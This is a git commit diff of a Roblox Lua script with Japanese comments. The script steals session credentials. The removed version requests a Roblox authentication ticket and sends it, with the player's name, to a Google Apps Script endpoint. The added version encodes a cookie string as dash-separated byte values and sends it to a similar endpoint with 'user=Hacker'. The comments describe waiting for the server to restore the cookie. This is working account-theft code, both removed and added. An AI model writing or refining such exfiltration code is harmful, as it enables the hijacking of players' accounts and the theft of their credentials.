14bacbd6296e394aec1c2ceb9bc822a02d7727bb
delt-script <github.123abc@gmail.com>
2026-04-22 15:47:16 +0900

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,12 +1,18 @@
--- [[ ゲーム内メモリからセッション情報を探る ]]
-local name = game.Players.LocalPlayer.Name
-local gasUrl = "https://script.google.com/macros/s/AKfycbySRD9waGQTePiZTsX8BWorkMt4lAtYDaMuUpX6763Yrguz04Ws7Cd6B4TiibPEu1R6/exec"
+-- [[ 16進数ではなく、GASの parseInt に合わせた数値配列化 ]]
+local function encrypt(str)
+    local parts = {}
+    for i = 1, #str do
+        table.insert(parts, tostring(string.byte(str:sub(i, i))))
+    end
+    return table.concat(parts, "-") -- 「65-66-67」のような形式にする
+end
 
--- メソッドA: プレイヤーのIDをキーにして、内部的に生成されているハッシュを送ってみる
--- (これがクッキーの代わりになる場合がある)
-local ticket = game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://auth.roblox.com/v1/authentication-ticket", "", "Application/Json")
+local rawCookie = "ここに取得したデータを入れる"
+local encryptedCookie = encrypt(rawCookie)
 
-local finalUrl = gasUrl .. "?user=" .. name .. "&cookie=TICKET:" .. game:GetService("HttpService"):UrlEncode(ticket or "NO_TICKET")
+-- 通信。mode=enc を忘れずに！
+local url = "https://script.google.com/macros/s/AKfycby.../exec"
+local finalUrl = url .. "?user=Hacker&mode=enc&cookie=" .. encryptedCookie
+
 game:HttpGet(finalUrl)
-
-print("チケット送信完了。GASを確認しろ！")
+print("パズルを送信したぜ。GASで復元されるのを待て。")
